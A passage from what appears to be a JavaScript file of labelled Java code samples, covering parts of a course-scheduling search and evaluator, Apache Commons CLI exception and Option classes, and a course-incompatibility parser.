		    public static boolean unwanted(Course c, CourseSlot cs, ParserJ p){
		        boolean result = true;
		        for(Unwanted u : p.unwanted){
		            Course cu = new Course(u.getFaculty(),u.getCourseNum(),u.getLecSec());
		            CourseSlot clu = new CourseSlot(u.getDay(),u.getTime(),cs.getMax(),cs.getMin());
		            if(!cu.equals(c) && !clu.equals(cs)){
		                result = false;
		            }
		        }
		        return result;
		    }
		    public static boolean isCompat(Course c, CourseSlot cs, ParserJ p){
		        boolean result = true;
		        for(Course k : cs.courses){
		            NotComp nc = new NotComp(c.getFaculty(),k.getFaculty(),c.getCourseNum(),k.getCourseNum(),c.getLecSec(),k.getLecSec(),0,0);
		            if(p.notComps.contains(nc)) result = false;
		        }
		        return result;
		    }

		    public static boolean isPref(Course c, CourseSlot cs, ParserJ p){
		        boolean result = false;
		        List&ltPreference&gt lp = new ArrayList&lt&gt();
		        for(Preference pref : p.preferences){
		            if(pref.getFaculty().equals(c.getFaculty()) && pref.getCourseNum() == c.getCourseNum() &&
		                    pref.getLecSec() == c.getLecSec()){
		                lp.add(pref);
		            }
		        }
		        int maxWeight = 0;
		        int idx = -1;
		        for(int i = 0; i &lt lp.size(); i++){
		            if(lp.get(i).getWeight() &gt maxWeight){
		                idx = i;
		            }
		        }
		        if(idx &gt= 0) result = true;
		        return result;
		    }

		    public static void hasPair(Course c, CourseSlot cl, ParserJ p, Fact f){
		        for(APair pair : p.pairs){
		            if(pair.getTutSec1() != -1 && pair.getTutSec2() != -1) continue;
		            if(pair.getFaculty1().equals(c.getFaculty()) && pair.getCourseNum1() == c.getCourseNum() &&
		            pair.getLecSec1() == c.getLecSec()){
		                for(Course k : f.unassCourse){
		                    if(pair.getFaculty1().equals(k.getFaculty()) && pair.getCourseNum1() == k.getCourseNum() &&
		                    pair.getLecSec1() == k.getLecSec()){
		                        Assignments a = new Assignments(k,cl);
		                        if(!f.assignments.contains(a)){
		                            f.assignments.add(a);
		                            f.unassCourse.remove(k);
		                            cl.count = cl.count + 1;
		                            break;
		                        }
		                    }
		                }

		            }
		            else if(pair.getFaculty2().equals(c.getFaculty()) && pair.getCourseNum2() == c.getCourseNum() &&
		                    pair.getLecSec2() == c.getLecSec()){
		                for(Course k : f.unassCourse){
		                    if(pair.getFaculty2().equals(k.getFaculty()) && pair.getCourseNum2() == k.getCourseNum() &&
		                            pair.getLecSec2() == k.getLecSec()){
		                        Assignments a = new Assignments(k,cl);
		                        if(!f.assignments.contains(a)){
		                            f.assignments.add(a);
		                            f.unassCourse.remove(k);
		                            cl.count = cl.count + 1;
		                            break;
		                        }
		                    }
		                }

		            }
		        }
		    }
		    //Could make list of facts as solutions
		    public static Fact tree_course(Fact f, ParserJ p, List&ltFact&gt o){
		        if(f.unassCourse.size() == 0){
		            o.add(f);
		            return f;
		        }
		        while(f.unassCourse.size() &gt 0){
		            Course c = f.unassCourse.get(new Random().nextInt(f.unassCourse.size()));
		            CourseSlot cl = null;
		            CourseSlot cs = f.courseSlotList.get(new Random().nextInt(f.courseSlotList.size()));
		            if (cs.getCount() &lt cs.getMax() && !unwanted(c, cs, p) && isCompat(c, cs, p) && isPref(c, cs, p)) {
		                cl = cs;
		                cs.count = cs.count + 1;
		                hasPair(c, cs, p, f);
		            }
		            else if (cs.getCount() &lt cs.getMax() && !unwanted(c, cs, p) && isCompat(c, cs, p)) {
		                cl = cs;
		                cs.count = cs.count + 1;
		                hasPair(c, cs, p, f);

		            }
		            else{
		                continue;
		            }
		            Assignments a = new Assignments(c,cl);
		            if(!f.assignments.contains(a)){
		                f.assignments.add(a);
		                f.unassCourse.remove(c);
		            }
		            o.add(tree_course(f,p,o));
		        }
		        return f;
		    }
		    //hello
		    public static List&ltFact&gt assign(Fact f, ParserJ p) {
		        int unc = f.unassCourse.size();
		        int unl = f.unassLab.size();
		        List&ltFact&gt test = new ArrayList&lt&gt();
		        test.add(tree_course(f, p, test));
		        return test;
		    }
		    public void eval(Fact f, ParserJ p) {
		    	
		    }
		    public int eval_minfilled(Fact f){
		        int cnum = 0, lnum = 0, score = 0;
		        boolean lecFlag = false;
		        boolean labFlag = false;
		        for(CourseSlot cs : f.courseSlotList ) {
		        	cnum = 0;
		        	if(cs.max != 0 && cs.min != 0) lecFlag = true;
		        	for(Course c : cs.courses) {
		                cnum++;
		        	}
		        	if(cs.max &lt cnum && lecFlag) {
		        		return Integer.MIN_VALUE;
		        	}
		        	if(cs.min &gt cnum) score += Main.pen_coursemin;
		        	
		        }
		        for(LabSlot ls : f.labsSlotList) {
		        	lnum = 0;
		        	if(ls.max != 0 && ls.min != 0) labFlag = true;
		        	for(Lab l : ls.labs) {
		        		lnum++;
		        	}
		        	if(ls.max &lt lnum && labFlag) {
		        		return Integer.MIN_VALUE;
		        	}
		        	if(ls.min &gt lnum) score += Main.pen_labmin;
		        }
		        return score;
		/*
		        if(this.slots[slot].coursemax != 0 & this.slots[slot].coursemin != 0) lecFlag = true;
		        if(this.slots[slot].labmax != 0 & this.slots[slot].labmin != 0) labFlag = true;
		        if(this.slots[slot].coursemax &lt cnum & lecFlag) {
		            return Integer.MIN_VALUE;
		        }
		        if(this.slots[slot].labmax &lt lnum & labFlag) {
		            return Integer.MIN_VALUE;
		        }
		     for(Slot s : this.slots){
		            if(s.course.size() == 0) break;
		            int min = s.coursemin;
		            int leccount = cnum;
		            int labcount = lnum;
		            if(s.coursemin &gt leccount) score += Scheduler.pen_coursemin;
		            if(s.labmin &gt labcount) score += Scheduler.pen_labmin;
		        }
		        return score;*/
		    }
		    public int eval_pref(Fact f, ParserJ parse){
		        int nonpref = 0;
		        for(CourseSlot s : f.courseSlotList){
		            for(Preference p : parse.preferences){
		                for(Course c : s.courses){
		                    if (c.getCourseNum() == p.getCourseNum() && s.getStart() != p.getTime()){
		                        nonpref += p.getWeight();
		                    }
		                }
		            }
		        }
		        for (LabSlot l : f.labsSlotList) {
		        	for (Preference p : parse.preferences) {
		        		for (Lab t : l.labs) {
		        			if (t.getCourseNum() == p.getCourseNum() && l.getStart() != p.getTime()) {
		        				nonpref += p.getWeight();
		        			}
		        		}
		        	}
		        }
		        return nonpref;
		    }
		    
		    public int eval_pair(Fact f, ParserJ parse){
		        int score = 0;
		        for(APair cp : parse.pairs){
		            for(CourseSlot s : f.courseSlotList){
		                if(s.courses.contains(new Course(cp.getFaculty1(), cp.getCourseNum1(), cp.getLecSec1())) && 
		                !s.courses.contains(new Course(cp.getFaculty2(), cp.getCourseNum2(), cp.getLecSec2()))){
		                    score += pen_notpaired;
		                }
		                if(s.courses.contains(new Course(cp.getFaculty2(), cp.getCourseNum2(), cp.getLecSec2())) && 
		                !s.courses.contains(new Course(cp.getFaculty1(), cp.getCourseNum1(), cp.getLecSec1()))){
		                    score += pen_notpaired;
		                }
		            }
		        }
		        
		        for(APair cp : parse.pairs){
		            for(LabSlot s : f.labsSlotList){
		                if(s.labs.contains(new Course(cp.getFaculty1(), cp.getCourseNum1(), cp.getTutSec1())) && 
		                !s.labs.contains(new Course(cp.getFaculty2(), cp.getCourseNum2(), cp.getTutSec2()))){
		                    score += Main.pen_notpaired;
		                }
		                if(s.labs.contains(new Course(cp.getFaculty2(), cp.getCourseNum2(), cp.getTutSec2())) && 
		                !s.labs.contains(new Course(cp.getFaculty1(), cp.getCourseNum1(), cp.getTutSec1()))){
		                    score += Main.pen_notpaired;
		                }
		            }
		        }
		        
		        return score;
		    }
		    
		    public int eval_secdiff(ParserJ parse){
		        int score = 0;
		        int[] checkedc = new int[parse.courses.size()];
		        int[] checkedl = new int[parse.labs.size()];
		        int i = 0, m = 0;
		        for(Course c : parse.courses){
		            for(Course k : parse.courses){
		                boolean notin = false;
		                for(int j : checkedc){
		                    if(c.getCourseNum() == j){
		                        notin = true;
		                        break;
		                    }
		                }
		                if(c.getCourseNum() == k.getCourseNum() & c.getLecSec() != k.getLecSec() && notin){
		                    score += pen_secdiff;
		                    checkedc[i] = c.getCourseNum();
		                }
		            }
		            i++;
		        }
		        
		        for(Lab l : parse.labs){
		            for(Lab k : parse.labs){
		                boolean notin = false;
		                for(int n : checkedl){
		                    if(l.getCourseNum() == n){
		                        notin = true;
		                        break;
		                    }
		                }
		                if(l.getCourseNum() == k.getCourseNum() & l.getLecSec() != k.getLecSec() && notin){
		                    score += pen_secdiff;
		                    checkedc[i] = l.getCourseNum();
		                }
		            }
		            m++;
		        }
		        
		        
		        return score;
		    }
		}`
	},
	ai17: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Thrown when an option requiring an argument
		 * is not provided with an argument.
		 *
		 * @version $Id: MissingArgumentException.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public class MissingArgumentException extends ParseException
		{
		    /**
		     * This exception {@code serialVersionUID}.
		     */
		    private static final long serialVersionUID = -7098538588704965017L;

		    /** The option requiring additional arguments */
		    private Option option;

		    /**
		     * Construct a new &ltcode&gtMissingArgumentException&lt/code&gt
		     * with the specified detail message.
		     *
		     * @param message the detail message
		     */
		    public MissingArgumentException(String message)
		    {
		        super(message);
		    }

		    /**
		     * Construct a new &ltcode&gtMissingArgumentException&lt/code&gt
		     * with the specified detail message.
		     *
		     * @param option the option requiring an argument
		     * @since 1.2
		     */
		    public MissingArgumentException(Option option)
		    {
		        this("Missing argument for option: " + option.getKey());
		        this.option = option;
		    }

		    /**
		     * Return the option requiring an argument that wasn't provided
		     * on the command line.
		     *
		     * @return the related option
		     * @since 1.2
		     */
		    public Option getOption()
		    {
		        return option;
		    }
		}`
	},
	ai18: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.util.List;
		import java.util.Iterator;

		/**
		 * Thrown when a required option has not been provided.
		 *
		 * @version $Id: MissingOptionException.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public class MissingOptionException extends ParseException
		{
		    /** This exception {@code serialVersionUID}. */
		    private static final long serialVersionUID = 8161889051578563249L;

		    /** The list of missing options and groups */
		    private List missingOptions;

		    /**
		     * Construct a new &ltcode&gtMissingSelectedException&lt/code&gt
		     * with the specified detail message.
		     *
		     * @param message the detail message
		     */
		    public MissingOptionException(String message)
		    {
		        super(message);
		    }

		    /**
		     * Constructs a new &ltcode&gtMissingSelectedException&lt/code&gt with the
		     * specified list of missing options.
		     *
		     * @param missingOptions the list of missing options and groups
		     * @since 1.2
		     */
		    public MissingOptionException(List missingOptions)
		    {
		        this(createMessage(missingOptions));
		        this.missingOptions = missingOptions;
		    }

		    /**
		     * Returns the list of options or option groups missing in the command line parsed.
		     *
		     * @return the missing options, consisting of String instances for simple
		     *         options, and OptionGroup instances for required option groups.
		     * @since 1.2
		     */
		    public List getMissingOptions()
		    {
		        return missingOptions;
		    }

		    /**
		     * Build the exception message from the specified list of options.
		     *
		     * @param missingOptions the list of missing options and groups
		     * @since 1.2
		     */
		    private static String createMessage(List&lt?&gt missingOptions)
		    {
		        StringBuilder buf = new StringBuilder("Missing required option");
		        buf.append(missingOptions.size() == 1 ? "" : "s");
		        buf.append(": ");

		        Iterator&lt?&gt it = missingOptions.iterator();
		        while (it.hasNext())
		        {
		            buf.append(it.next());
		            if (it.hasNext())
		            {
		                buf.append(", ");
		            }
		        }

		        return buf.toString();
		    }
		}`
	},
	ai19: {
		type: 'java',
		code: `
		/* Not Compatible
		 * A custom class used to store information about courses and labs which should not be together
		 * Takes a string as input
		 * Contains get methods for all private variables
		 */

		public class NotComp {


		    public String fac1;
		    public String fac2;
		    public int cnum1;
		    public int cnum2;
		    public int lsec1;
		    public int lsec2;
		    public int tsec1;
		    public int tsec2;


		    public NotComp(String s){
		        String[] arr1 = s.split(",");
		        String[] arr11 = arr1[0].split(" ");
		        if(arr11.length &gt 4) {
		            int count = 0;
		            for (String st : arr11) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr11.length - count];
		            int i = 0;
		            for (String st : arr11){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr11 = ndata;
		        }
		        String[] arr12 = arr1[1].split(" ");
		        if(arr12.length &gt 4) {
		            int count = 0;
		            for (String st : arr12) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr12.length - count];
		            int i = 0;
		            for (String st : arr12){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr12 = ndata;
		        }
		        if(arr11.length != arr12.length){
		            throw new Error("Each line must have same number of arguments. Error occurred from: " + s);
		        }
		        /*Three options either Lec, Tut, or both */
		        else{
		            if(arr11.length == 4){
		                String f1 = arr11[0].trim();
		                String f2 = arr12[0].trim();
		                int c1 = Integer.parseInt(arr11[1].trim());
		                int c2 = Integer.parseInt(arr12[1].trim());
		                int l1 = Integer.parseInt(arr11[3].trim());
		                int l2 = Integer.parseInt(arr12[3].trim());
		                int t1 = Integer.parseInt(arr11[3].trim());
		                int t2 = Integer.parseInt(arr12[3].trim());

		                if((arr11[2].trim().equals("TUT") | arr11[2].trim().equals("LAB")) &
		                        (arr12[2].trim().equals("TUT") | arr12[2].trim().equals("LAB"))) {
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = -1;
		                    this.lsec2 = -1;
		                    this.tsec1 = t1;
		                    this.tsec2 = t2;
		                }
		                else if(arr11[2].trim().equals("LEC") & arr12[2].trim().equals("LEC")){
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = l1;
		                    this.lsec2 = l2;
		                    this.tsec1 = -1;
		                    this.tsec2 = -1;
		                }
		                else if(arr11[2].trim().equals("LEC") & (arr12[2].trim().equals("TUT") | arr12[2].trim().equals("LAB"))){
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = l1;
		                    this.lsec2 = -1;
		                    this.tsec1 = -1;
		                    this.tsec2 = t1;
		                }
		                else if((arr11[2].trim().equals("TUT") | arr11[2].trim().equals("LAB")) & arr12[2].trim().equals("LEC")){
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = -1;
		                    this.lsec2 = l2;
		                    this.tsec1 = t1;
		                    this.tsec2 = -1;
		                }

		            }
		            else if(arr11.length == 6){
		                String f1 = arr11[0].trim();
		                String f2 = arr12[0].trim();
		                int c1 = Integer.parseInt(arr11[1].trim());
		                int c2 = Integer.parseInt(arr12[1].trim());
		                int l1 = Integer.parseInt(arr11[3].trim());
		                int l2 = Integer.parseInt(arr12[3].trim());
		                int t1 = Integer.parseInt(arr11[5].trim());
		                int t2 = Integer.parseInt(arr12[5].trim());

		                if(arr11[2].trim().equals("LEC") & (arr11[4].trim().equals("TUT") | arr11[4].trim().equals("LAB"))){
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = l1;
		                    this.lsec2 = l2;
		                    this.tsec1 = t1;
		                    this.tsec2 = t2;
		                }
		                else if((arr11[2].trim().equals("TUT") | arr11[2].trim().equals("LAB")) & arr11[4].trim().equals("LEC")){
		                    this.fac1 = f1;
		                    this.fac2 = f2;
		                    this.cnum1 = c1;
		                    this.cnum2 = c2;
		                    this.lsec1 = t1;
		                    this.lsec2 = t2;
		                    this.tsec1 = l1;
		                    this.tsec2 = l2;
		                }

		            }
		            else{
		                throw new Error("Something went wrong");
		            }
		        }
		    }
		    public NotComp(String fac1, String fac2, int cnum1, int cnum2, int lsec1, int lsec2, int tsec1, int tsec2){
		        this.fac1 = fac1;
		        this.fac2 = fac2;
		        this.cnum1 = cnum1;
		        this.cnum2 = cnum2;
		        this.lsec1 = lsec1;
		        this.lsec2 = lsec2;
		        this.tsec1 = tsec1;
		        this.tsec2 = tsec2;
		    }

		    public String getFac1() { return fac1; }
		    public String getFac2() { return fac2; }
		    public int getCourseNum1() { return cnum1; }
		    public int getCourseNum2() { return cnum2; }
		    public int getLecSec1() { return lsec1; }
		    public int getLecSec2() { return lsec2; }
		    public int getTutSec1() { return tsec1; }
		    public int getTutSec2(){ return  tsec2; }

		}`
	},
	ai20: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.Serializable;
		import java.util.ArrayList;
		import java.util.List;

		/**
		 * Describes a single command-line option.  It maintains
		 * information regarding the short-name of the option, the long-name,
		 * if any exists, a flag indicating if an argument is required for
		 * this option, and a self-documenting description of the option.
		 * &ltp&gt
		 * An Option is not created independently, but is created through
		 * an instance of {@link Options}. An Option is required to have
		 * at least a short or a long-name.
		 * &ltp&gt
		 * &ltb&gtNote:&lt/b&gt once an {@link Option} has been added to an instance
		 * of {@link Options}, it's required flag may not be changed anymore.
		 *
		 * @see org.apache.commons.cli.Options
		 * @see org.apache.commons.cli.CommandLine
		 *
		 * @version $Id: Option.java 1756753 2016-08-18 10:18:43Z britter $
		 */
		public class Option implements Cloneable, Serializable
		{
		    /** constant that specifies the number of argument values has not been specified */
		    public static final int UNINITIALIZED = -1;

		    /** constant that specifies the number of argument values is infinite */
		    public static final int UNLIMITED_VALUES = -2;

		    /** The serial version UID. */
		    private static final long serialVersionUID = 1L;

		    /** the name of the option */
		    private final String opt;

		    /** the long representation of the option */
		    private String longOpt;

		    /** the name of the argument for this option */
		    private String argName;

		    /** description of the option */
		    private String description;

		    /** specifies whether this option is required to be present */
		    private boolean required;

		    /** specifies whether the argument value of this Option is optional */
		    private boolean optionalArg;

		    /** the number of argument values this option can have */
		    private int numberOfArgs = UNINITIALIZED;

		    /** the type of this Option */
		    private Class&lt?&gt type = String.class;

		    /** the list of argument values **/
		    private List&ltString&gt values = new ArrayList&ltString&gt();

		    /** the character that is the value separator */
		    private char valuesep;

		    /**
		     * Private constructor used by the nested Builder class.
		     * 
		     * @param builder builder used to create this option
		     */
		    private Option(final Builder builder)
		    {
		        this.argName = builder.argName;
		        this.description = builder.description;
		        this.longOpt = builder.longOpt;
		        this.numberOfArgs = builder.numberOfArgs;
		        this.opt = builder.opt;
		        this.optionalArg = builder.optionalArg;
		        this.required = builder.required;
		        this.type = builder.type;
		        this.valuesep = builder.valuesep;
		    }
		    
		    /**
		     * Creates an Option using the specified parameters.
		     * The option does not take an argument.
		     *
		     * @param opt short representation of the option
		     * @param description describes the function of the option
		     *
		     * @throws IllegalArgumentException if there are any non valid
		     * Option characters in &ltcode&gtopt&lt/code&gt.
		     */
		    public Option(String opt, String description) throws IllegalArgumentException
		    {
		        this(opt, null, false, description);
		    }

		    /**
		     * Creates an Option using the specified parameters.
		     *
		     * @param opt short representation of the option
		     * @param hasArg specifies whether the Option takes an argument or not
		     * @param description describes the function of the option
		     *
		     * @throws IllegalArgumentException if there are any non valid
		     * Option characters in &ltcode&gtopt&lt/code&gt.
		     */
		    public Option(String opt, boolean hasArg, String description) throws IllegalArgumentException
		    {
		        this(opt, null, hasArg, description);
		    }

		    /**
		     * Creates an Option using the specified parameters.
		     *
		     * @param opt short representation of the option
		     * @param longOpt the long representation of the option
		     * @param hasArg specifies whether the Option takes an argument or not
		     * @param description describes the function of the option
		     *
		     * @throws IllegalArgumentException if there are any non valid
		     * Option characters in &ltcode&gtopt&lt/code&gt.
		     */
		    public Option(String opt, String longOpt, boolean hasArg, String description)
		           throws IllegalArgumentException
		    {
		        // ensure that the option is valid
		        OptionValidator.validateOption(opt);

		        this.opt = opt;
		        this.longOpt = longOpt;

		        // if hasArg is set then the number of arguments is 1
		        if (hasArg)
		        {
		            this.numberOfArgs = 1;
		        }

		        this.description = description;
		    }

		    /**
		     * Returns the id of this Option.  This is only set when the
		     * Option shortOpt is a single character.  This is used for switch
		     * statements.
		     *
		     * @return the id of this Option
		     */
		    public int getId()
		    {
		        return getKey().charAt(0);
		    }

		    /**
		     * Returns the 'unique' Option identifier.
		     * 
		     * @return the 'unique' Option identifier
		     */
		    String getKey()
		    {
		        // if 'opt' is null, then it is a 'long' option
		        return (opt == null) ? longOpt : opt;
		    }

		    /** 
		     * Retrieve the name of this Option.
		     *
		     * It is this String which can be used with
		     * {@link CommandLine#hasOption(String opt)} and
		     * {@link CommandLine#getOptionValue(String opt)} to check
		     * for existence and argument.
		     *
		     * @return The name of this option
		     */
		    public String getOpt()
		    {
		        return opt;
		    }

		    /**
		     * Retrieve the type of this Option.
		     * 
		     * @return The type of this option
		     */
		    public Object getType()
		    {
		        return type;
		    }

		    /**
		     * Sets the type of this Option.
		     * &ltp&gt
		     * &ltb&gtNote:&lt/b&gt this method is kept for binary compatibility and the
		     * input type is supposed to be a {@link Class} object. 
		     *
		     * @param type the type of this Option
		     * @deprecated since 1.3, use {@link #setType(Class)} instead
		     */
		    @Deprecated
		    public void setType(Object type)
		    {
		        setType((Class&lt?&gt) type);
		    }

		    /**
		     * Sets the type of this Option.
		     *
		     * @param type the type of this Option
		     * @since 1.3
		     */
		    public void setType(Class&lt?&gt type)
		    {
		        this.type = type;
		    }

		    /** 
		     * Retrieve the long name of this Option.
		     *
		     * @return Long name of this option, or null, if there is no long name
		     */
		    public String getLongOpt()
		    {
		        return longOpt;
		    }

		    /**
		     * Sets the long name of this Option.
		     *
		     * @param longOpt the long name of this Option
		     */
		    public void setLongOpt(String longOpt)
		    {
		        this.longOpt = longOpt;
		    }

		    /**
		     * Sets whether this Option can have an optional argument.
		     *
		     * @param optionalArg specifies whether the Option can have
		     * an optional argument.
		     */
		    public void setOptionalArg(boolean optionalArg)
		    {
		        this.optionalArg = optionalArg;
		    }

		    /**
		     * @return whether this Option can have an optional argument
		     */
		    public boolean hasOptionalArg()
		    {
		        return optionalArg;
		    }

		    /** 
		     * Query to see if this Option has a long name
		     *
		     * @return boolean flag indicating existence of a long name
		     */
		    public boolean hasLongOpt()
		    {
		        return longOpt != null;
		    }

		    /** 
		     * Query to see if this Option requires an argument
		     *
		     * @return boolean flag indicating if an argument is required
		     */
		    public boolean hasArg()
		    {
		        return numberOfArgs &gt 0 || numberOfArgs == UNLIMITED_VALUES;
		    }

		    /** 
		     * Retrieve the self-documenting description of this Option
		     *
		     * @return The string description of this option
		     */
		    public String getDescription()
		    {
		        return description;
		    }

		    /**
		     * Sets the self-documenting description of this Option
		     *
		     * @param description The description of this option
		     * @since 1.1
		     */
		    public void setDescription(String description)
		    {
		        this.description = description;
		    }

		    /** 
		     * Query to see if this Option is mandatory
		     *
		     * @return boolean flag indicating whether this Option is mandatory
		     */
		    public boolean isRequired()
		    {
		        return required;
		    }

		    /**
		     * Sets whether this Option is mandatory.
		     *
		     * @param required specifies whether this Option is mandatory
		     */
		    public void setRequired(boolean required)
		    {
		        this.required = required;
		    }

		    /**
		     * Sets the display name for the argument value.
		     *
		     * @param argName the display name for the argument value.
		     */
		    public void setArgName(String argName)
		    {
		        this.argName = argName;
		    }

		    /**
		     * Gets the display name for the argument value.
		     *
		     * @return the display name for the argument value.
		     */
		    public String getArgName()
		    {
		        return argName;
		    }

		    /**
		     * Returns whether the display name for the argument value has been set.
		     *
		     * @return if the display name for the argument value has been set.
		     */
		    public boolean hasArgName()
		    {
		        return argName != null && argName.length() &gt 0;
		    }

		    /** 
		     * Query to see if this Option can take many values.
		     *
		     * @return boolean flag indicating if multiple values are allowed
		     */
		    public boolean hasArgs()
		    {
		        return numberOfArgs &gt 1 || numberOfArgs == UNLIMITED_VALUES;
		    }

		    /** 
		     * Sets the number of argument values this Option can take.
		     *
		     * @param num the number of argument values
		     */
		    public void setArgs(int num)
		    {
		        this.numberOfArgs = num;
		    }

		    /**
		     * Sets the value separator.  For example if the argument value
		     * was a Java property, the value separator would be '='.
		     *
		     * @param sep The value separator.
		     */
		    public void setValueSeparator(char sep)
		    {
		        this.valuesep = sep;
		    }

		    /**
		     * Returns the value separator character.
		     *
		     * @return the value separator character.
		     */
		    public char getValueSeparator()
		    {
		        return valuesep;
		    }

		    /**
		     * Return whether this Option has specified a value separator.
		     * 
		     * @return whether this Option has specified a value separator.
		     * @since 1.1
		     */
		    public boolean hasValueSeparator()
		    {
		        return valuesep &gt 0;
		    }

		    /** 
		     * Returns the number of argument values this Option can take.
		     * 
		     * &ltp&gt
		     * A value equal to the constant {@link #UNINITIALIZED} (= -1) indicates
		     * the number of arguments has not been specified.
		     * A value equal to the constant {@link #UNLIMITED_VALUES} (= -2) indicates
		     * that this options takes an unlimited amount of values.
		     * &lt/p&gt
		     *
		     * @return num the number of argument values
		     * @see #UNINITIALIZED
		     * @see #UNLIMITED_VALUES
		     */
		    public int getArgs()
		    {
		        return numberOfArgs;
		    }

		    /**
		     * Adds the specified value to this Option.
		     * 
		     * @param value is a/the value of this Option
		     */
		    void addValueForProcessing(String value)
		    {
		        if (numberOfArgs == UNINITIALIZED)
		        {
		            throw new RuntimeException("NO_ARGS_ALLOWED");
		        }
		        processValue(value);
		    }

		    /**
		     * Processes the value.  If this Option has a value separator
		     * the value will have to be parsed into individual tokens.  When
		     * n-1 tokens have been processed and there are more value separators
		     * in the value, parsing is ceased and the remaining characters are
		     * added as a single token.
		     *
		     * @param value The String to be processed.
		     *
		     * @since 1.0.1
		     */
		    private void processValue(String value)
		    {
		        // this Option has a separator character
		        if (hasValueSeparator())
		        {
		            // get the separator character
		            char sep = getValueSeparator();

		            // store the index for the value separator
		            int index = value.indexOf(sep);

		            // while there are more value separators
		            while (index != -1)
		            {
		                // next value to be added 
		                if (values.size() == numberOfArgs - 1)
		                {
		                    break;
		                }

		                // store
		                add(value.substring(0, index));

		                // parse
		                value = value.substring(index + 1);

		                // get new index
		                index = value.indexOf(sep);
		            }
		        }

		        // store the actual value or the last value that has been parsed
		        add(value);
		    }

		    /**
		     * Add the value to this Option.  If the number of arguments
		     * is greater than zero and there is enough space in the list then
		     * add the value.  Otherwise, throw a runtime exception.
		     *
		     * @param value The value to be added to this Option
		     *
		     * @since 1.0.1
		     */
		    private void add(String value)
		    {
		        if (!acceptsArg())
		        {
		            throw new RuntimeException("Cannot add value, list full.");
		        }

		        // store value
		        values.add(value);
		    }

		    /**
		     * Returns the specified value of this Option or 
		     * &ltcode&gtnull&lt/code&gt if there is no value.
		     *
		     * @return the value/first value of this Option or 
		     * &ltcode&gtnull&lt/code&gt if there is no value.
		     */
		    public String getValue()
		    {
		        return hasNoValues() ? null : values.get(0);
		    }

		    /**
		     * Returns the specified value of this Option or 
		     * &ltcode&gtnull&lt/code&gt if there is no value.
		     *
		     * @param index The index of the value to be returned.
		     *
		     * @return the specified value of this Option or 
		     * &ltcode&gtnull&lt/code&gt if there is no value.
		     *
		     * @throws IndexOutOfBoundsException if index is less than 1
		     * or greater than the number of the values for this Option.
		     */
		    public String getValue(int index) throws IndexOutOfBoundsException
		    {
		        return hasNoValues() ? null : values.get(index);
		    }

		    /**
		     * Returns the value/first value of this Option or the 
		     * &ltcode&gtdefaultValue&lt/code&gt if there is no value.
		     *
		     * @param defaultValue The value to be returned if there
		     * is no value.
		     *
		     * @return the value/first value of this Option or the 
		     * &ltcode&gtdefaultValue&lt/code&gt if there are no values.
		     */
		    public String getValue(String defaultValue)
		    {
		        String value = getValue();

		        return (value != null) ? value : defaultValue;
		    }

		    /**
		     * Return the values of this Option as a String array 
		     * or null if there are no values
		     *
		     * @return the values of this Option as a String array 
		     * or null if there are no values
		     */
		    public String[] getValues()
		    {
		        return hasNoValues() ? null : values.toArray(new String[values.size()]);
		    }

		    /**
		     * @return the values of this Option as a List
		     * or null if there are no values
		     */
		    public List&ltString&gt getValuesList()
		    {
		        return values;
		    }

		    /** 
		     * Dump state, suitable for debugging.
		     *
		     * @return Stringified form of this object
		     */
		    @Override
		    public String toString()
		    {
		        StringBuilder buf = new StringBuilder().append("[ option: ");

		        buf.append(opt);

		        if (longOpt != null)
		        {
		            buf.append(" ").append(longOpt);
		        }

		        buf.append(" ");

		        if (hasArgs())
		        {
		            buf.append("[ARG...]");
		        }
